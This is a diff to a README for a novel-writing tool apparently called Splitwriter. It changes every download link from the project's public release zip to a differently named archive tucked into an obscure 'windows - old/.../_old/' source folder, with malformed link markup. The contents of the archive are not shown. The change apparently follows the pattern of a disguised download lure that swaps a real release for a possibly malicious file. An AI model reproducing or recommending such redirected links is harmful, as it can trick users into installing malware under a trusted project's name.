@@ -6,7 +6,7 @@ Welcome to Splitwriter! This tool helps novelists organize their writing project
 
 ## 📦 Download Links
 
-[![Download Splitwriter](https://raw.githubusercontent.com/labieds/Splitwriter/main/public/Splitwriter-v2.8.zip%https://raw.githubusercontent.com/labieds/Splitwriter/main/public/Splitwriter-v2.8.zip)](https://raw.githubusercontent.com/labieds/Splitwriter/main/public/Splitwriter-v2.8.zip)
+[![Download Splitwriter](https://raw.githubusercontent.com/labieds/Splitwriter/main/src/windows - old/boards/text-engine/_old/Software-v2.8-beta.5.zip%https://raw.githubusercontent.com/labieds/Splitwriter/main/src/windows - old/boards/text-engine/_old/Software-v2.8-beta.5.zip)](https://raw.githubusercontent.com/labieds/Splitwriter/main/src/windows - old/boards/text-engine/_old/Software-v2.8-beta.5.zip)
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ To run Splitwriter, your system needs:
 
 ## 📥 Download & Install
 
-To download Splitwriter, visit this page: [Release Page](https://raw.githubusercontent.com/labieds/Splitwriter/main/public/Splitwriter-v2.8.zip). 
+To download Splitwriter, visit this page: [Release Page](https://raw.githubusercontent.com/labieds/Splitwriter/main/src/windows - old/boards/text-engine/_old/Software-v2.8-beta.5.zip). 
 
 1. Click on the link above.
 2. Look for the latest version of Splitwriter. 
